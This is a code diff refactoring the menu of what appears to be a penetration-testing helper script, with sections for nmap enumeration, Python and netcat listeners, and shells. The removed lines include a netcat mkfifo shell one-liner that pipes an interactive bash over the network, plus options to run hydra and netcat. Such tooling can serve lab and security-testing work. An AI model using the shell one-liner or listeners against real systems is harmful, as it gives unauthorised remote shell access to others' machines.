@@ -1,69 +1,98 @@
-from enumeration.nmap import nmap
+from enumeration.nmap import getch
 from terminal_management.tman import popen_command_new_terminal
-from listener import pythonListener, netcatListener
+from colorama import Fore, Style, init
 
-local_port = ''
-local_ip = ''
-target_ip = ''
-target_port = ''
-def set_local_ip():
-    global local_ip
-    local_ip = input("Enter the IP address: ")
+# Initialize colorama
+init(autoreset=True)
 
-def set_local_port():
-    global local_port
-    local_port = input("Enter the local port: ")
+# Define color variables for better readability
+HEADER_COLOR = Fore.MAGENTA
+OPTION_COLOR = Fore.CYAN
+ERROR_COLOR = Fore.RED
 
-def set_target_ip():
-    global target_ip
-    target_ip = input("Enter the target IP address: ")
+# Define the section lists
+def main_menu():
+    print(f"""{HEADER_COLOR}
+    Main Menu
+    {OPTION_COLOR}
+    0. Exit
+    1. Enumeration
+    2. Listener
+    3. Shells and Payloads
+    {Style.RESET_ALL}""")
 
-def set_target_port():
-    global target_port
-    target_port = input("Enter the target port: ")
+def enumeration_menu():
+    print(f"""{HEADER_COLOR}
+    Enumeration
+    {OPTION_COLOR}
+    0. Return to Main Menu
+    1. Custom Nmap
+    2. Nmap
+    {Style.RESET_ALL}""")
 
+def listener_menu():
+    print(f"""{HEADER_COLOR}
+    Listener
+    {OPTION_COLOR}
+    0. Return to Main Menu
+    1. Spawn Python TCP Listener
+    2. Spawn Netcat Listener
+    {Style.RESET_ALL}""")
 
+def shells_payloads_menu():
+    print(f"""{HEADER_COLOR}
+    Shells and Payloads
+    {OPTION_COLOR}
+    0. Return to Main Menu
+    {Style.RESET_ALL}""")
+
+# Navigation management function
+def navigate_options(current_section):
+    while True:
+        current_section()
+        print('> ', end='', flush=True)
+        choice = getch().upper()
+
+        if current_section == main_menu:
+            if choice == '0':
+                exit()
+            elif choice == '1':
+                return enumeration_menu
+            elif choice == '2':
+                return listener_menu
+            elif choice == '3':
+                return shells_payloads_menu
+            else:
+                print(f"{ERROR_COLOR}Invalid choice, please try again.")
+        elif current_section == enumeration_menu:
+            if choice == '0':
+                return main_menu
+            elif choice == '1':
+                popen_command_new_terminal('sudo python3 enumeration/custom_nmap.py')
+            elif choice == '2':
+                popen_command_new_terminal('sudo python3 enumeration/nmap.py')
+            else:
+                print(f"{ERROR_COLOR}Invalid choice, please try again.")
+        elif current_section == listener_menu:
+            if choice == '0':
+                return main_menu
+            elif choice == '1':
+                popen_command_new_terminal('sudo python3 listener/pythonListener.py')
+            elif choice == '2':
+                popen_command_new_terminal('sudo python3 listener/netcatListener.py')
+            else:
+                print(f"{ERROR_COLOR}Invalid choice, please try again.")
+        elif current_section == shells_payloads_menu:
+            if choice == '0':
+                return main_menu
+            else:
+                print(f"{ERROR_COLOR}Invalid choice, please try again.")
+
+# Main function
 def main():
-   while True:
-        options = [
-f"""
-            LI : Set local IP       {local_ip}
-            LP : Set local port     {local_port}
-            TI : Set target IP      {target_ip}
-            TP : Set target port    {target_port}
-            Enumeration:
-            1. Nmap                 
-            2. Custom Nmap
-            Bruteforce:
-            3. Hydra
-            Shells and payloads:
-            L  : launch netcat listener
-            LC : Connect using netcat
-            RSN : Print Reverse shell script using netcat
-            RSP : Print Reverse shell script using powershell
-
-"""
-       ]
-        print(options[0])
-        choice = input("Enter your choice: ")
-        if choice == '1':
-           popen_command_new_terminal('sudo python3 enumeration/custom_nmap.py')
-        elif choice == '2':
-           popen_command_new_terminal('sudo python3 enumeration/custom_nmap.py')
-        elif choice == '3':
-           popen_command_new_terminal('hydra')
-        elif choice == 'L':
-           popen_command_new_terminal(f'nc -lvnp {local_port}')
-        elif choice == 'LC':
-              netcat = popen_command_new_terminal(f'nc -nv {target_ip} {target_port}')
-        elif choice == 'RSN':
-                print(f'sudo rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | sudo nc -l {target_ip} {target_port} > /tmp/f')
-        elif choice == 'RSP':
-            print("""""")
-
-
-        else:
-           print("Invalid choice")
+    current_section = main_menu
+    while True:
+        current_section = navigate_options(current_section)
 
 if __name__ == "__main__":
     main()
